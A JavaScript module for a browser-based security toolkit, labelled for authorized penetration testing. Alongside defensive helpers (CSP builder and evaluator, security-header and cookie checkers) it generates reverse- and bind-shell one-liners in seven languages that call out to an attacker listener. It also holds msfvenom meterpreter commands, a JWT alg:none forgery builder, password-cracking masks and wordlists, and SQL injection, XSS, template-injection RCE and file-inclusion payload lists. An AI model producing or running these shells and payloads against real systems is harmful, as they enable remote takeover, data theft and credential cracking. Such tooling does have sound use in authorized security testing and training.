// Copyright (c) 2026 Darknode-Official. All rights reserved. See LICENSE.
// Web / application-security mini-tools: payload builders, cheatsheets and analyzers
// for AUTHORIZED penetration testing and red/blue team exercises. See _schema.md.
const S = (v) => (v == null ? "" : String(v));

function b64urlEncodeBytes(u8) {
  let bin = "";
  for (let i = 0; i < u8.length; i++) bin += String.fromCharCode(u8[i]);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function b64urlDecodeToBytes(s) {
  let t = String(s).trim().replace(/-/g, "+").replace(/_/g, "/");
  while (t.length % 4) t += "=";
  const bin = atob(t);
  const u = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
  return u;
}
function jsonPretty(obj) { return JSON.stringify(obj, null, 2); }
function splitJwt(token) {
  const parts = String(token || "").trim().split(".");
  if (parts.length < 2) return null;
  return parts;
}

export const TOOLS = [
  // ---------------- JWT ----------------
  { id: "w-jwt-decode", name: "JWT Decoder", cat: "websec", desc: "Decode a JSON Web Token's header and payload without verifying the signature (authorized token inspection).", tags: ["jwt", "jose", "token"],
    inputs: [{ k: "token", label: "JWT", type: "textarea", rows: 4, placeholder: "eyJhbGciOi..." }],
    run(v, H) {
      if (!v.token) return "";
      const parts = splitJwt(v.token);
      if (!parts || parts.length < 2) return { error: "Not a JWT (expected header.payload.signature)." };
      try {
        const header = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[0])));
        const payload = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[1])));
        const sig = parts[2] ? parts[2] : "(none)";
        return `HEADER:\n${jsonPretty(header)}\n\nPAYLOAD:\n${jsonPretty(payload)}\n\nSIGNATURE (base64url): ${sig}`;
      } catch (e) { return { error: "Could not decode: malformed base64url or JSON." }; }
    } },

  { id: "w-jwt-none", name: "JWT alg:none PoC Builder", cat: "websec", desc: "Re-encode a JWT with alg:none and a stripped signature, to test for missing signature-verification (authorized testing).", tags: ["jwt", "alg none", "bypass"],
    inputs: [{ k: "token", label: "Original JWT", type: "textarea", rows: 3 }, { k: "variant", label: "alg value", type: "select", opts: ["none", "None", "NONE"], value: "none" }],
    run(v, H) {
      if (!v.token) return "";
      const parts = splitJwt(v.token);
      if (!parts || parts.length < 2) return { error: "Not a JWT." };
      try {
        const header = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[0])));
        header.alg = v.variant;
        const h64 = b64urlEncodeBytes(H.bytes(JSON.stringify(header)));
        const p64 = parts[1];
        return `${h64}.${p64}.\n\n(trailing dot = empty signature; some libraries also accept the dot omitted)`;
      } catch (e) { return { error: "Could not parse header JSON." }; }
    } },

  { id: "w-jwt-hs256-verify", name: "JWT HS256 Verifier", cat: "websec", desc: "Verify a JWT's HS256 signature against a candidate secret (authorized secret brute-force / config checks).", tags: ["jwt", "hs256", "hmac", "verify"],
    inputs: [{ k: "token", label: "JWT", type: "textarea", rows: 3 }, { k: "secret", label: "Secret", type: "text", placeholder: "supersecret" }],
    async run(v, H) {
      if (!v.token || !v.secret) return "";
      const parts = splitJwt(v.token);
      if (!parts || parts.length !== 3) return { error: "Not a complete JWT (need header.payload.signature)." };
      try {
        const header = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[0])));
        if (header.alg !== "HS256") return { error: `Header alg is "${header.alg}", not HS256.` };
        const hex = await H.hmac("SHA-256", v.secret, `${parts[0]}.${parts[1]}`);
        const bytes = H.fromHex(hex);
        const expected = b64urlEncodeBytes(bytes);
        const ok = expected === parts[2];
        return ok ? "VALID — signature matches secret." : `INVALID — expected ${expected}\ngot      ${parts[2]}`;
      } catch (e) { return { error: "Could not verify: malformed token." }; }
    } },

  { id: "w-jwt-hs256-sign", name: "JWT HS256 Signer", cat: "websec", desc: "Build and sign a JWT (HS256) from a header, payload and secret, for testing token-handling logic.", tags: ["jwt", "hs256", "sign", "build"],
    inputs: [{ k: "header", label: "Header JSON", type: "textarea", rows: 2, value: '{"alg":"HS256","typ":"JWT"}' }, { k: "payload", label: "Payload JSON", type: "textarea", rows: 4, value: '{"sub":"1234567890","name":"tester","iat":1700000000}' }, { k: "secret", label: "Secret", type: "text", placeholder: "supersecret" }],
    async run(v, H) {
      if (!v.header || !v.payload || !v.secret) return "";
      let header, payload;
      try { header = JSON.parse(v.header); } catch (e) { return { error: "Header is not valid JSON." }; }
      try { payload = JSON.parse(v.payload); } catch (e) { return { error: "Payload is not valid JSON." }; }
      header.alg = "HS256";
      const h64 = b64urlEncodeBytes(H.bytes(JSON.stringify(header)));
      const p64 = b64urlEncodeBytes(H.bytes(JSON.stringify(payload)));
      const hex = await H.hmac("SHA-256", v.secret, `${h64}.${p64}`);
      const sig = b64urlEncodeBytes(H.fromHex(hex));
      return `${h64}.${p64}.${sig}`;
    } },

  // ---------------- Headers / CSP / CORS ----------------
  { id: "w-csp-builder", name: "CSP Policy Builder", cat: "websec", desc: "Compose a Content-Security-Policy header from per-directive source lists.", tags: ["csp", "header"],
    inputs: [
      { k: "defaultSrc", label: "default-src", type: "text", value: "'self'" },
      { k: "scriptSrc", label: "script-src", type: "text", value: "'self'" },
      { k: "styleSrc", label: "style-src", type: "text", value: "'self'" },
      { k: "imgSrc", label: "img-src", type: "text", value: "'self' data:" },
      { k: "connectSrc", label: "connect-src", type: "text", value: "'self'" },
      { k: "fontSrc", label: "font-src", type: "text" },
      { k: "frameAncestors", label: "frame-ancestors", type: "text", value: "'none'" },
      { k: "objectSrc", label: "object-src", type: "text", value: "'none'" },
      { k: "baseUri", label: "base-uri", type: "text", value: "'self'" },
      { k: "formAction", label: "form-action", type: "text", value: "'self'" },
      { k: "upgradeInsecure", label: "upgrade-insecure-requests", type: "checkbox", value: true },
    ],
    run(v) {
      const parts = [];
      const push = (name, val) => { if (val && val.trim()) parts.push(`${name} ${val.trim()}`); };
      push("default-src", v.defaultSrc); push("script-src", v.scriptSrc); push("style-src", v.styleSrc);
      push("img-src", v.imgSrc); push("connect-src", v.connectSrc); push("font-src", v.fontSrc);
      push("frame-ancestors", v.frameAncestors); push("object-src", v.objectSrc); push("base-uri", v.baseUri); push("form-action", v.formAction);
      if (v.upgradeInsecure) parts.push("upgrade-insecure-requests");
      if (!parts.length) return { error: "Set at least one directive." };
      return `Content-Security-Policy: ${parts.join("; ")}`;
    } },

  { id: "w-csp-evaluator", name: "CSP Policy Evaluator", cat: "websec", desc: "Parse a Content-Security-Policy header and flag weak directives ('unsafe-inline', '*', missing object-src, etc).", tags: ["csp", "audit", "header"],
    inputs: [{ k: "policy", label: "CSP header value", type: "textarea", rows: 4, placeholder: "default-src 'self'; script-src 'self' 'unsafe-inline'" }],
    run(v) {
      if (!v.policy) return "";
      const directives = v.policy.split(";").map((d) => d.trim()).filter(Boolean);
      if (!directives.length) return { error: "Empty policy." };
      const findings = [];
      const map = {};
      for (const d of directives) {
        const [name, ...vals] = d.split(/\s+/);
        map[name] = vals;
        if (vals.includes("'unsafe-inline'")) findings.push(`WARN ${name}: 'unsafe-inline' allows inline scripts/styles (XSS risk).`);
        if (vals.includes("'unsafe-eval'")) findings.push(`WARN ${name}: 'unsafe-eval' allows eval()/Function() (injection risk).`);
        if (vals.includes("*")) findings.push(`WARN ${name}: wildcard '*' allows any origin.`);
        if (vals.some((s) => /^https?:$/.test(s))) findings.push(`WARN ${name}: bare scheme (http:/https:) allows any host on that scheme.`);
      }
      if (!map["object-src"]) findings.push("WARN missing object-src — should be 'none' to block plugin-based XSS.");
      if (!map["base-uri"]) findings.push("WARN missing base-uri — allows <base> tag injection to hijack relative URLs.");
      if (!map["frame-ancestors"]) findings.push("INFO missing frame-ancestors — no clickjacking protection from CSP.");
      if (!map["script-src"] && !map["default-src"]) findings.push("WARN no script-src or default-src — scripts unrestricted.");
      return findings.length ? findings.join("\n") : "No obvious weaknesses found in the directives present.";
    } },

  { id: "w-security-headers", name: "Security Headers Generator", cat: "websec", desc: "Generate a recommended baseline set of HTTP security response headers.", tags: ["headers", "hardening"],
    inputs: [
      { k: "hsts", label: "Include HSTS", type: "checkbox", value: true },
      { k: "hstsMaxAge", label: "HSTS max-age (seconds)", type: "text", value: "31536000" },
      { k: "frameOptions", label: "X-Frame-Options", type: "select", opts: ["DENY", "SAMEORIGIN"], value: "DENY" },
      { k: "referrer", label: "Referrer-Policy", type: "select", opts: ["no-referrer", "strict-origin-when-cross-origin", "same-origin"], value: "strict-origin-when-cross-origin" },
    ],
    run(v) {
      const lines = [
        v.hsts ? `Strict-Transport-Security: max-age=${v.hstsMaxAge || 31536000}; includeSubDomains; preload` : null,
        `X-Content-Type-Options: nosniff`,
        `X-Frame-Options: ${v.frameOptions}`,
        `Referrer-Policy: ${v.referrer}`,
        `Permissions-Policy: geolocation=(), microphone=(), camera=()`,
        `Cross-Origin-Opener-Policy: same-origin`,
        `Cross-Origin-Resource-Policy: same-origin`,
        `X-XSS-Protection: 0`,
      ].filter(Boolean);
      return lines.join("\n");
    } },

  { id: "w-cors-preflight", name: "CORS Preflight Explainer", cat: "websec", desc: "Given a request Origin/Method/Headers, show what the server's preflight response must contain for it to succeed.", tags: ["cors", "preflight"],
    inputs: [
      { k: "origin", label: "Request Origin", type: "text", value: "https://evil.example" },
      { k: "method", label: "Request Method", type: "select", opts: ["GET", "POST", "PUT", "PATCH", "DELETE"], value: "PUT" },
      { k: "headers", label: "Custom request headers (comma-sep)", type: "text", value: "Content-Type, X-Auth-Token" },
      { k: "credentials", label: "Request includes credentials (cookies)", type: "checkbox" },
    ],
    run(v) {
      const hdrs = (v.headers || "").split(",").map((h) => h.trim()).filter(Boolean);
      const lines = [];
      lines.push(`Browser sends OPTIONS preflight to the target with:`);
      lines.push(`  Origin: ${v.origin}`);
      lines.push(`  Access-Control-Request-Method: ${v.method}`);
      if (hdrs.length) lines.push(`  Access-Control-Request-Headers: ${hdrs.join(", ")}`);
      lines.push("");
      lines.push(`For the real request to succeed, the server's OPTIONS response must include:`);
      lines.push(`  Access-Control-Allow-Origin: ${v.origin}${v.credentials ? " (must be exact, not *)" : ""}`);
      lines.push(`  Access-Control-Allow-Methods: ${v.method}`);
      if (hdrs.length) lines.push(`  Access-Control-Allow-Headers: ${hdrs.join(", ")}`);
      if (v.credentials) lines.push(`  Access-Control-Allow-Credentials: true`);
      lines.push("");
      lines.push(v.credentials
        ? "NOTE: with credentials, Allow-Origin can never be '*' and Allow-Credentials must be exactly 'true' — misconfigurations here (origin reflection + credentials) are a common CORS vuln to test for."
        : "NOTE: without credentials, a wildcard Allow-Origin: * is valid but still worth flagging if the endpoint returns sensitive data.");
      return lines.join("\n");
    } },

  { id: "w-set-cookie-analyzer", name: "Set-Cookie Flag Analyzer", cat: "websec", desc: "Parse a Set-Cookie header and report missing Secure/HttpOnly/SameSite protections.", tags: ["cookie", "audit"],
    inputs: [{ k: "cookie", label: "Set-Cookie value", type: "textarea", rows: 3, placeholder: "session=abc123; Path=/" }],
    run(v) {
      if (!v.cookie) return "";
      const parts = v.cookie.split(";").map((p) => p.trim()).filter(Boolean);
      if (!parts.length) return { error: "Empty cookie." };
      const nameVal = parts[0];
      const attrs = parts.slice(1).map((p) => p.split("=")[0].toLowerCase());
      const findings = [];
      findings.push(`Cookie: ${nameVal}`);
      findings.push(attrs.includes("secure") ? "OK   Secure set — not sent over plain HTTP." : "WARN Secure missing — cookie can be sent over HTTP, exposing it to network attackers.");
      findings.push(attrs.includes("httponly") ? "OK   HttpOnly set — not readable via document.cookie (mitigates XSS theft)." : "WARN HttpOnly missing — cookie is readable by JavaScript, stealable via XSS.");
      const sameSite = parts.slice(1).find((p) => p.toLowerCase().startsWith("samesite="));
      if (sameSite) {
        const val = sameSite.split("=")[1];
        findings.push(`INFO SameSite=${val}${/^none$/i.test(val) && !attrs.includes("secure") ? " — SameSite=None REQUIRES Secure." : ""}`);
      } else findings.push("WARN SameSite missing — defaults vary by browser; set explicitly (Strict/Lax/None) for CSRF protection.");
      if (!parts.slice(1).some((p) => /^path=/i.test(p))) findings.push("INFO Path not set — defaults to the request path, may over-scope or under-scope the cookie.");
      return findings.join("\n");
    } },

  { id: "w-csp-nonce", name: "CSP Nonce Generator", cat: "websec", desc: "Generate a cryptographically random nonce for script-src/style-src 'nonce-...' CSP directives.", tags: ["csp", "nonce"],
    button: "Generate", live: false,
    inputs: [{ k: "bytes", label: "Entropy bytes", type: "range", min: 8, max: 32, step: 8, value: 16 }],
    run(v, H) {
      const n = H.clampInt(v.bytes, 8, 32, 16);
      const b64 = btoa(String.fromCharCode(...H.randBytes(n)));
      return `nonce value: ${b64}\n\nHeader:  Content-Security-Policy: script-src 'nonce-${b64}'\nHTML:    <script nonce="${b64}">...</script>`;
    } },

  // ---------------- Shells / payload builders ----------------
  { id: "w-revshell", name: "Reverse Shell Generator", cat: "websec", desc: "Generate reverse-shell one-liners for an authorized engagement listener (LHOST/LPORT).", tags: ["shell", "reverse shell", "payload"],
    inputs: [
      { k: "lang", label: "Language/tool", type: "select", opts: ["bash", "python", "php", "powershell", "nc", "perl", "ruby"], value: "bash" },
      { k: "lhost", label: "LHOST", type: "text", value: "10.10.10.10" },
      { k: "lport", label: "LPORT", type: "text", value: "4444" },
    ],
    run(v) {
      const h = (v.lhost || "").trim(), p = (v.lport || "").trim();
      if (!h || !p) return { error: "Set LHOST and LPORT." };
      const gens = {
        bash: `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
        python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`,
        php: `php -r '$sock=fsockopen("${h}",${p});$proc=proc_open("/bin/sh -i", [0=>$sock,1=>$sock,2=>$sock], $pipes);'`,
        powershell: `$c=New-Object System.Net.Sockets.TCPClient("${h}",${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS>";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}`,
        nc: `nc -e /bin/sh ${h} ${p}   # if nc lacks -e: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
        perl: `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        ruby: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${h}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
      };
      return `${gens[v.lang]}\n\nStart a listener first: nc -lvnp ${p}\nFor authorized engagements only.`;
    } },

  { id: "w-bindshell", name: "Bind Shell Generator", cat: "websec", desc: "Generate bind-shell one-liners that listen on the target for an authorized engagement.", tags: ["shell", "bind shell", "payload"],
    inputs: [
      { k: "lang", label: "Language/tool", type: "select", opts: ["bash", "python", "nc", "powershell"], value: "bash" },
      { k: "port", label: "Listen port", type: "text", value: "4444" },
    ],
    run(v) {
      const p = (v.port || "").trim();
      if (!p) return { error: "Set a port." };
      const gens = {
        bash: `mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc -lvnp ${p} > /tmp/f`,
        python: `python3 -c 'import socket,os,pty;s=socket.socket();s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`,
        nc: `nc -lvnp ${p} -e /bin/sh`,
        powershell: `$l=New-Object System.Net.Sockets.TcpListener(${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS>";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}`,
      };
      return `${gens[v.lang]}\n\nConnect with: nc <target> ${p}\nFor authorized engagements only.`;
    } },

  { id: "w-msfvenom", name: "msfvenom Command Builder", cat: "websec", desc: "Build an msfvenom payload-generation command from payload type, LHOST/LPORT and output format.", tags: ["metasploit", "msfvenom", "payload"],
    inputs: [
      { k: "payload", label: "Payload", type: "select", opts: ["windows/x64/meterpreter/reverse_tcp", "linux/x64/meterpreter/reverse_tcp", "windows/x64/shell/reverse_tcp", "php/meterpreter/reverse_tcp", "android/meterpreter/reverse_tcp", "osx/x64/meterpreter/reverse_tcp"], value: "windows/x64/meterpreter/reverse_tcp" },
      { k: "lhost", label: "LHOST", type: "text", value: "10.10.10.10" },
      { k: "lport", label: "LPORT", type: "text", value: "4444" },
      { k: "format", label: "Output format (-f)", type: "select", opts: ["exe", "elf", "raw", "php", "apk", "macho", "psh"], value: "exe" },
      { k: "out", label: "Output file", type: "text", value: "payload.exe" },
    ],
    run(v) {
      if (!v.lhost || !v.lport) return { error: "Set LHOST and LPORT." };
      return `msfvenom -p ${v.payload} LHOST=${v.lhost} LPORT=${v.lport} -f ${v.format} -o ${v.out || "payload.out"}`;
    } },

  // ---------------- Cracking ----------------
  { id: "w-hashcat-mask", name: "Hashcat Mask Builder", cat: "websec", desc: "Build a hashcat mask (-a 3) from charset toggles and password length, for authorized credential-recovery tests.", tags: ["hashcat", "mask", "cracking"],
    inputs: [
      { k: "lower", label: "lowercase (?l)", type: "checkbox", value: true },
      { k: "upper", label: "uppercase (?u)", type: "checkbox", value: true },
      { k: "digit", label: "digits (?d)", type: "checkbox", value: true },
      { k: "special", label: "special (?s)", type: "checkbox" },
      { k: "length", label: "Length", type: "range", min: 1, max: 16, step: 1, value: 8 },
    ],
    run(v, H) {
      const classes = [];
      if (v.lower) classes.push("?l");
      if (v.upper) classes.push("?u");
      if (v.digit) classes.push("?d");
      if (v.special) classes.push("?s");
      if (!classes.length) return { error: "Enable at least one character class." };
      const len = H.clampInt(v.length, 1, 32, 8);
      const custom = classes.join("");
      const mask = Array(len).fill("?1").join("");
      return `hashcat -a 3 -1 ${custom} hashes.txt ${mask}\n\n(custom charset ?1 = ${custom}, ${len} positions)`;
    } },

  { id: "w-hashcat-modes", name: "Hashcat Mode Reference", cat: "websec", desc: "Searchable reference of common hashcat -m hash-type modes.", tags: ["hashcat", "modes", "reference"],
    inputs: [{ k: "q", label: "Filter", type: "text", placeholder: "ntlm, bcrypt, sha256..." }],
    run(v) {
      const modes = [
        [0, "MD5"], [10, "md5($pass.$salt)"], [20, "md5($salt.$pass)"], [100, "SHA1"], [900, "MD4"],
        [1000, "NTLM"], [1400, "SHA2-256"], [1700, "SHA2-512"], [1800, "sha512crypt $6$ (Unix)"],
        [500, "md5crypt $1$ (Unix)"], [3200, "bcrypt $2*$"], [7400, "sha256crypt $5$ (Unix)"],
        [1300, "SHA2-224"], [10800, "SHA2-384"], [5500, "NetNTLMv1"], [5600, "NetNTLMv2"],
        [13100, "Kerberos 5 TGS-REP etype 23"], [18200, "Kerberos 5 AS-REP etype 23"], [7500, "Kerberos 5 AS-REQ Pre-Auth"],
        [2500, "WPA-EAPOL-PBKDF2"], [22000, "WPA-PBKDF2-PMKID+EAPOL"], [400, "phpass (WordPress/Joomla)"],
        [3717, "MySQL $A$"], [300, "MySQL4.1/MySQL5 (SHA1(SHA1))"], [131, "MSSQL(2000)"], [1731, "MSSQL(2012, 2014)"],
        [1731, "MSSQL(2016)"], [111, "nsldap SHA-1"], [1421, "hMailServer"], [21, "osCommerce/xt:Commerce MD5"],
        [124, "Django SHA-1"], [10000, "Django PBKDF2-SHA256"], [1000, "Windows NTLM"], [3000, "LM"],
        [11600, "7-Zip"], [12500, "RAR3-hp"], [13600, "WinZip"], [16800, "WPA-PMKID-PBKDF2"], [22, "Juniper NetScreen/SSG"],
        [6211, "TrueCrypt AES"], [8300, "DNSSEC (NSEC3)"], [12000, "PBKDF2-HMAC-SHA1"], [10900, "PBKDF2-HMAC-SHA256"],
      ];
      const q = (v.q || "").toLowerCase().trim();
      const filtered = q ? modes.filter(([m, name]) => String(m).includes(q) || name.toLowerCase().includes(q)) : modes;
      if (!filtered.length) return "No matches.";
      return filtered.map(([m, name]) => `-m ${m}\t${name}`).join("\n");
    } },

  { id: "w-john-rules", name: "John the Ripper Rule Reference", cat: "websec", desc: "Quick reference for common John the Ripper mangling-rule syntax.", tags: ["john", "rules", "cracking"],
    inputs: [{ k: "q", label: "Filter", type: "text", placeholder: "capitalize, append..." }],
    run(v) {
      const rules = [
        [":", "no-op — pass the word through unchanged"],
        ["l", "lowercase the whole word"],
        ["u", "uppercase the whole word"],
        ["c", "capitalize (first upper, rest lower)"],
        ["C", "invert capitalize (first lower, rest upper)"],
        ["r", "reverse the word"],
        ["d", "duplicate the word (word -> wordword)"],
        ["f", "reflect (word -> worddrow)"],
        ["$X", "append character X to end"],
        ["^X", "prepend character X to start"],
        ["[", "delete first character"],
        ["]", "delete last character"],
        ["T0", "toggle case of character at position 0"],
        ["A0\"str\"", "insert string 'str' at position 0"],
        ["sXY", "substitute all X with Y (e.g. sa@)"],
        ["<N", "reject words longer than N"],
        [">N", "reject words shorter than N"],
        ["'N", "truncate word to length N"],
        ["Q", "reject word if it contains no digit"],
        ["p", "pluralize (crude heuristic)"],
        ["M", "memorize word for later reuse in rule"],
        ["Q", "duplicate first char N times: e.g. z3"],
      ];
      const q = (v.q || "").toLowerCase().trim();
      const filtered = q ? rules.filter(([r, d]) => r.toLowerCase().includes(q) || d.toLowerCase().includes(q)) : rules;
      if (!filtered.length) return "No matches.";
      return filtered.map(([r, d]) => `${r}\t${d}`).join("\n");
    } },

  { id: "w-wordlist-mangler", name: "Wordlist Mangler", cat: "websec", desc: "Expand base words into capitalize/leet/suffix variants for authorized password wordlist generation.", tags: ["wordlist", "mangle", "cracking"],
    inputs: [
      { k: "words", label: "Base words (one per line)", type: "textarea", rows: 4, placeholder: "summer\ncompany" },
      { k: "capitalize", label: "Add capitalized variant", type: "checkbox", value: true },
      { k: "leet", label: "Add leetspeak variant", type: "checkbox", value: true },
      { k: "digits", label: "Append 0-9", type: "checkbox", value: true },
      { k: "years", label: "Append years 1990-2029", type: "checkbox" },
    ],
    run(v) {
      const words = (v.words || "").split(/\r?\n/).map((w) => w.trim()).filter(Boolean);
      if (!words.length) return { error: "Enter at least one word." };
      const leetMap = { a: "4", e: "3", i: "1", o: "0", s: "5", t: "7" };
      const toLeet = (w) => w.toLowerCase().replace(/[aeiost]/g, (c) => leetMap[c]);
      const base = new Set();
      for (const w of words) {
        base.add(w);
        if (v.capitalize) base.add(w[0].toUpperCase() + w.slice(1));
        if (v.leet) base.add(toLeet(w));
      }
      const out = new Set(base);
      if (v.digits) for (const w of base) for (let d = 0; d <= 9; d++) out.add(w + d);
      if (v.years) for (const w of base) for (let y = 1990; y <= 2029; y++) out.add(w + y);
      const list = Array.from(out);
      if (list.length > 5000) return { error: `Generated ${list.length} entries — narrow the input (too large to display).` };
      return list.join("\n");
    } },

  // ---------------- Injection cheatsheets ----------------
  { id: "w-sqli-cheatsheet", name: "SQLi Cheatsheet", cat: "websec", desc: "Reference payloads for SQL injection testing: auth bypass, UNION, error-based, time-based.", tags: ["sqli", "injection", "cheatsheet"],
    inputs: [{ k: "category", label: "Category", type: "select", opts: ["Auth bypass", "UNION-based", "Error-based", "Time-based (blind)"], value: "Auth bypass" }],
    run(v) {
      const sets = {
        "Auth bypass": [
          `' OR '1'='1`, `' OR '1'='1' -- -`, `' OR 1=1#`, `admin'--`, `admin' #`, `' OR 'a'='a`,
          `") OR ("1"="1`, `' OR 1=1 LIMIT 1 -- -`,
        ],
        "UNION-based": [
          `' UNION SELECT NULL-- -`, `' UNION SELECT NULL,NULL-- -`, `' UNION SELECT username,password FROM users-- -`,
          `' ORDER BY 1-- -   (increment to find column count)`, `' UNION SELECT @@version,NULL-- -`,
        ],
        "Error-based": [
          `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`,
          `' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -`,
          `' AND 1=CONVERT(int,(SELECT @@version))-- -   (MSSQL)`,
          `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
        ],
        "Time-based (blind)": [
          `' OR IF(1=1,SLEEP(5),0)-- -   (MySQL)`,
          `'; WAITFOR DELAY '0:0:5'--   (MSSQL)`,
          `' OR pg_sleep(5)-- -   (PostgreSQL)`,
          `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`,
        ],
      };
      return sets[v.category].join("\n");
    } },

  { id: "w-xss-payload-gen", name: "XSS Payload Generator", cat: "websec", desc: "Generate a context-appropriate XSS proof-of-concept payload (HTML body / attribute / JS / URL context).", tags: ["xss", "payload"],
    inputs: [
      { k: "context", label: "Injection context", type: "select", opts: ["HTML body", "HTML attribute", "JavaScript string", "URL/href"], value: "HTML body" },
      { k: "marker", label: "Callback marker (e.g. alert value)", type: "text", value: "XSS" },
    ],
    run(v) {
      const m = v.marker || "XSS";
      const gens = {
        "HTML body": `<script>alert('${m}')</script>\n<img src=x onerror=alert('${m}')>\n<svg onload=alert('${m}')>`,
        "HTML attribute": `" onmouseover=alert('${m}') x="\n' autofocus onfocus=alert('${m}') x='`,
        "JavaScript string": `';alert('${m}');//\n\\';alert('${m}');//`,
        "URL/href": `javascript:alert('${m}')\ndata:text/html,<script>alert('${m}')</script>`,
      };
      return gens[v.context];
    } },

  { id: "w-xss-context-encoder", name: "XSS Context Encoder", cat: "websec", desc: "Encode a payload for injection into a specific output context (HTML entities / JS string / URL / Base64).", tags: ["xss", "encode"],
    inputs: [{ k: "payload", label: "Payload", type: "textarea", rows: 2, placeholder: "<script>alert(1)</script>" }, { k: "context", label: "Target context", type: "select", opts: ["HTML entities", "JS string escape", "URL encode", "Base64 (for data:)"], value: "HTML entities" }],
    run(v, H) {
      if (!v.payload) return "";
      switch (v.context) {
        case "HTML entities": return v.payload.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
        case "JS string escape": return JSON.stringify(v.payload).slice(1, -1);
        case "URL encode": return encodeURIComponent(v.payload);
        case "Base64 (for data:)": return H.b64encode(v.payload);
        default: return { error: "Unknown context." };
      }
    } },

  { id: "w-ssti-cheatsheet", name: "SSTI Payload Cheatsheet", cat: "websec", desc: "Server-Side Template Injection detection and RCE-path payloads by template engine.", tags: ["ssti", "injection", "cheatsheet"],
    inputs: [{ k: "engine", label: "Template engine", type: "select", opts: ["Jinja2 (Python)", "Twig (PHP)", "Freemarker (Java)", "ERB (Ruby)"], value: "Jinja2 (Python)" }],
    run(v) {
      const sets = {
        "Jinja2 (Python)": [
          `{{7*7}}   (detection — expect 49)`,
          `{{config}}`,
          `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
          `{{''.__class__.__mro__[1].__subclasses__()}}`,
        ],
        "Twig (PHP)": [
          `{{7*7}}   (detection — expect 49)`,
          `{{_self}}`,
          `{{['id']|filter('system')}}`,
          `{{['cat\\x20/etc/passwd']|map('system')|join}}`,
        ],
        "Freemarker (Java)": [
          `\${7*7}   (detection — expect 49)`,
          `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
        ],
        "ERB (Ruby)": [
          `<%= 7*7 %>   (detection — expect 49)`,
          `<%= system('id') %>`,
          `<%= \`id\` %>`,
        ],
      };
      return sets[v.engine].join("\n");
    } },

  { id: "w-lfi-payloads", name: "LFI Payload List", cat: "websec", desc: "Local File Inclusion payloads: PHP wrappers and path-traversal depths for testing include/read endpoints.", tags: ["lfi", "php", "traversal"],
    inputs: [{ k: "target", label: "Target file", type: "text", value: "/etc/passwd" }, { k: "maxDepth", label: "Max traversal depth", type: "range", min: 1, max: 12, step: 1, value: 6 }],
    run(v, H) {
      const target = (v.target || "/etc/passwd").replace(/^\/+/, "");
      const depth = H.clampInt(v.maxDepth, 1, 20, 6);
      const lines = [];
      for (let d = 1; d <= depth; d++) lines.push("../".repeat(d) + target);
      lines.push("");
      lines.push("PHP wrappers:");
      lines.push(`php://filter/convert.base64-encode/resource=${v.target}`);
      lines.push(`php://filter/read=string.rot13/resource=${v.target}`);
      lines.push(`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`);
      lines.push(`expect://id`);
      lines.push(`/proc/self/environ`);
      lines.push(`/var/log/apache2/access.log   (log poisoning)`);
      return lines.join("\n");
    } },

  { id: "w-path-traversal-encoder", name: "Path Traversal Encoder", cat: "websec", desc: "Build ../ traversal sequences at a chosen depth and produce URL-encoded / double-encoded / overlong variants for filter bypass testing.", tags: ["traversal", "encode", "bypass"],
    inputs: [{ k: "depth", label: "Depth (../ repeats)", type: "range", min: 1, max: 12, step: 1, value: 4 }, { k: "target", label: "Target path", type: "text", value: "etc/passwd" }],
    run(v, H) {
      const depth = H.clampInt(v.depth, 1, 20, 4);
      const target = (v.target || "").replace(/^\/+/, "");
      const raw = "../".repeat(depth) + target;
      const enc = encodeURIComponent(raw);
      const dbl = encodeURIComponent(enc);
      const overlong = "..%c0%af".repeat(depth) + target;
      const backslash = "..\\".repeat(depth) + target.replace(/\//g, "\\");
      return [
        `Raw:            ${raw}`,
        `URL-encoded:    ${enc}`,
        `Double-encoded: ${dbl}`,
        `Overlong UTF-8: ${overlong}`,
        `Backslash:      ${backslash}`,
      ].join("\n");
    } },

